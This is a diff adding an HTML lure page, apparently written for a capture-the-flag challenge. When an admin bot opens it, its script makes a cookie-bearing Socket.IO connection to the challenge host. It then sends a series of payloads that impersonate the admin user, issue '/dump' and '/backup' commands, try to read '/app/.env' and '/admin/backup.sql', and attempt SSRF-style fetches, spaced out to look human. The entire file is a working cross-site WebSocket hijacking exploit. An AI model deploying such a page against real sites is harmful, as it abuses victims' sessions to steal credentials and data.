@@ -1,0 +1,97 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8"/>
+  <title>Nice article</title>
+</head>
+<body>
+  <h2>Click here for important update</h2>
+  <p id="status">waiting...</p>
+  <script>
+    // Carga dinámica del cliente Socket.IO (CDN)
+    (function loadIo(cb){
+      const s = document.createElement('script');
+      s.src = "https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.8.1/socket.io.min.js";
+      s.integrity = "sha512-8ExARjWWkIllMlNzVg7JKq9RKWPlJABQUNq6YvAjE/HobctjH/NA+bSiDMDvouBVjp4Wwnf1VP1OEv7Zgjtuxw==";
+      s.crossOrigin = "anonymous";
+      s.referrerPolicy = "no-referrer";
+      s.onload = cb;
+      s.onerror = function(){ document.getElementById('status').innerText = 'failed to load socket.io'; };
+      document.head.appendChild(s);
+    })(main);
+
+    async function main(){
+      try {
+        document.getElementById('status').innerText = 'socket.io loaded, connecting...';
+        // Ajusta el host/puerto objetivo
+        const TARGET = "http://challenges.challenge-ecw.eu:33037";
+        // Crear la conexión - esto enviará automáticamente las cookies del dominio SI el navegador está en ese dominio.
+        // Desde una página externa esto usará WebSocket al host objetivo (el navegador agrega cookies para ese host).
+        const socket = io(TARGET, { transports: ['websocket'], withCredentials: true });
+
+        socket.onAny((ev,p) => {
+          console.log("[EV]", ev, p);
+          // mostrar respuesta en la página para facilidad
+          const el = document.getElementById('status');
+          el.innerText = `${new Date().toISOString()} | ${ev} => ${JSON.stringify(p).slice(0,300)}`;
+        });
+
+        socket.on('connect', () => {
+          console.log("[*] connected as", socket.id);
+          document.getElementById('status').innerText = 'connected, emitting...';
+
+          // ==== Payloads a emitir desde el navegador del admin ====
+          // Ajusta/añade los payloads que creas que el bot acepta.
+          const tries = [
+            // forma simple (texto)
+            {ev:'message', payload:'/dump'},
+            {ev:'message', payload:'/backup'},
+            // object-shaped impersonation (varias formas)
+            {ev:'message', payload:{ user: 'admin', message: '/dump' }},
+            {ev:'message', payload:{ username: 'admin', message: '/dump' }},
+            {ev:'message', payload:{ from: 'admin', text: '/dump' }},
+            {ev:'message', payload:{ actor: 'admin', command: '/dump' }},
+            {ev:'message', payload:{ role: 'admin', command: '/dump' }},
+            // intentar eventos admin específicos
+            {ev:'admin:dump', payload:{ token: 'investigator'}},
+            {ev:'admin:getUsers', payload:{}},
+            {ev:'command', payload:{ actor: 'admin', command: '/dump' }},
+            // probar lectura directa (si el bot implementa)
+            {ev:'message', payload:{ user: 'admin', message: '/read /admin/backup.sql' }},
+            {ev:'message', payload:{ user: 'admin', message: '/read /app/.env' }},
+            // payloads que provocan que el servidor haga fetch de URLs (SSRF style)
+            {ev:'message', payload:{ user:'admin', message: 'fetch:/admin/backup.sql' }},
+            {ev:'message', payload:{ user:'admin', message: 'GET /admin/backup.sql' }},
+          ];
+
+          // emitir con delays para parecer "humano"
+          (async function emitAll(){
+            for (let i=0;i<tries.length;i++){
+              const t = tries[i];
+              try {
+                console.log('[emit]', t.ev, t.payload);
+                socket.emit(t.ev, t.payload);
+              } catch(e){
+                console.error('emit err', e);
+              }
+              await new Promise(r=>setTimeout(r, 700));
+            }
+            console.log('[*] done emits, waiting for responses');
+            // opcional: pedir al bot que diga si ha creado un backup
+            socket.emit('message','/whoami');
+          })();
+        });
+
+        socket.on('connect_error', (err) => {
+          console.error('connect_error', err);
+          document.getElementById('status').innerText = 'connect_error: ' + (err && err.message ? err.message : err);
+        });
+
+      } catch (e){
+        console.error(e);
+        document.getElementById('status').innerText = 'error: ' + e;
+      }
+    }
+  </script>
+</body>
+</html>
